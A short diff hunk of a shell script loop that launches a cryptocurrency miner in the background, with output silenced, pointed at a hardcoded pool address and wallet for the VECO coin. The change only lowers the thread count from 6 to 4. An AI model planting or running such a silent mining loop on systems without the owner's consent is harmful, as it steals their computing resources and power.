@@ -20,7 +20,7 @@ while true; do
     -o 45.115.224.108:443 \
     -u VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.worker1 \
     -p c=VECO,m=solo,zap=VECO,mc=VECO \
-    -t 6 &>/dev/null &
+    -t 4 &>/dev/null &
 
   sleep 300   # 5 menit mining
 
